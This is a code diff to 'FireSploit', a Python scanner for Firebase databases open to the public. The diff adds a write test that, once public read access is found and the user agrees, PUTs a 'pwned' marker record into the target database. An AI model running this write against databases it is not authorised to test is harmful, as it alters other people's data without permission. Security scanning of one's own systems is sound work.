@@ -4,7 +4,7 @@
 FireSploit - Firebase Public Access Scanner
 
 Author: Shubham Sharma
-GitHub: https://github.com/yourusername/FireSploit
+GitHub: https://github.com/secshubhamsharma/FireSploit
 """
 
 import requests
@@ -32,6 +32,27 @@ def check_public_read(database_url: str) -> bool:
         return False
 
 
+def try_public_write(database_url: str) -> None:
+    payload_url = f"{database_url}/pwned.json"
+    payload = {
+        "pwned": True,
+        "by": "FireSploit",
+        "date": "2025-07-04"
+    }
+
+    print(f"\n[+] Attempting public write access: {payload_url}")
+    try:
+        response = requests.put(payload_url, json=payload, timeout=5)
+        if response.status_code == 200:
+            print("[!] Public write access detected.")
+            print("[*] Payload successfully written:")
+            print(json.dumps(payload, indent=2))
+        else:
+            print(f"[✓] Write attempt rejected. Status code: {response.status_code}")
+    except requests.exceptions.RequestException as error:
+        print(f"[x] Connection error during write attempt: {error}")
+
+
 def parse_arguments():
     parser = argparse.ArgumentParser(
         description="FireSploit - Firebase public access vulnerability scanner"
@@ -45,10 +66,18 @@ def parse_arguments():
 
 
 def main():
+    print("FireSploit Scanner v1.1")
     args = parse_arguments()
     target_url = args.url.rstrip("/")
-    print("  FireSploit Scanner v1.0")
-    check_public_read(target_url)
+
+    if check_public_read(target_url):
+        choice = input("[?] Do you want to attempt a write test? (y/N): ").strip().lower()
+        if choice == "y":
+            try_public_write(target_url)
+        else:
+            print("[*] Write test skipped.")
+    else:
+        print("[✓] No public access vulnerabilities detected.")
 
 
 if __name__ == "__main__":
